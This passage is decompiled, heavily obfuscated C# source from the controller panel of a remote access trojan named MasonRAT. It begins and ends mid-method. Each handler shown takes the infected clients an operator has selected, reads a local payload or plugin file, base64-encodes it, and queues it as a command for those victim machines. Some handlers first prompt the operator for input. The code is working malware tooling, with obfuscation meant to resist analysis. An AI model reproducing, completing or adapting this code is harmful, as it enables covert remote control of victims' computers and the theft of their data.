        byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) (\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1934) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1935))) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ), Right), (object) Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ), (object) \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1936))));
        try
        {
          foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
          {
            Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
            Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
          }
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270Cﻻـڣ\u0608ۏڇ\u060D\u060D\u060Aــۧبـ\u0609ٸڛڠﮪ(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
      object Right = (object) Interaction.InputBox(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1937), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1938), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1939), ((1633329101 - (138006194 | 220174337) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) > 808728764 - ~171239053 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 ? -1540897618 - ~1540897616 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 : (-11 ^ 10) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 + 0), (-320692985 ^ 1583178488 << 1545380640) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 - (1899205106 + -203791452 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 << (-723547488 - -1023639413 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << -0);
      if (!string.IsNullOrWhiteSpace(Conversions.ToString(Right)))
      {
        byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) (\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1940) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1941))) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ), Right), (object) Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ), (object) \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1942))));
        try
        {
          foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
          {
            Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
            Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
          }
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270Cڙ\u060A\u060Cڦـ\u060Fٺڝىژڙ\u0608\u060Aـ\u0608\u0608ـۏﻋ\u0608(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
      object Right = (object) Interaction.InputBox(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1943), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1944), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1945), (345912036 - 720234816 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + (1984754744 - (1442059724 | 523839769) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + -0, ((553648124 ^ 3) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) - ((527072611 | 1202741004) - 1594614573 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 << (1592839774 ^ 9) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 + 0));
      if (!string.IsNullOrWhiteSpace(Conversions.ToString(Right)))
      {
        byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) (\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1946) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1947))) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ), Right), (object) Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ), (object) \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1948))));
        try
        {
          foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
          {
            Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
            Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
          }
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270Cـٸ\u060A̍مد\u0609ڙــ\u060Aـــ̍ـ(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    if (MessageBox.Show(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1949), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1950), (MessageBoxButtons) (((-2068395306 ^ ~1949077504) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) - (((479245226 ^ 1740479111 % 1955796385) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) >> ((995636269 ^ 14) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 ^ 0))) == (DialogResult) ((366460527 ^ 366468806 % 1905093582) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 - ((399273391 ^ (1715721948 | 1429049823)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 >> (2022375994 - 183863786 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 << 1))
    {
      try
      {
        byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1951) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1952))));
        try
        {
          foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
          {
            Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
            Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
          }
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) MessageBox.Show(ex.Message);
        ProjectData.ClearProjectError();
      }
    }
  }

  private void \u2694️MasonRAT\u270Cـڜ\u060F̍بﯧڞــ\u060C(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
      byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1953) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1954))));
      try
      {
        foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
        {
          Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
          Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270C\u0609ٺـڙـﮪۚ\u0609ؤْ\u0608ـڙڙ\u0609(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    string str = Interaction.InputBox(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1955), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1956), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1957), (1414445950 - (414108692 | 1035947643) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 ^ ~(-948192552 - ~1326658086 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + -0, (-1869730723 - -748053121 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) + (-260928553 - -1382606154 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 << 1));
    if (str.Length != 0)
    {
      byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1958) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + str);
      try
      {
        foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
        {
          Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
          Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
  }

  private void \u2694️MasonRAT\u270C\u060Aڝـּ\u060Dـــ\u060Cﻻ(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
      byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1959) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1960))));
      try
      {
        foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
        {
          Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
          Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270C\u060Aـٺد\u060Aټـ\u0609ټٺ\u060Eڝ\u060Dـژةــ\u060E\u060D(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
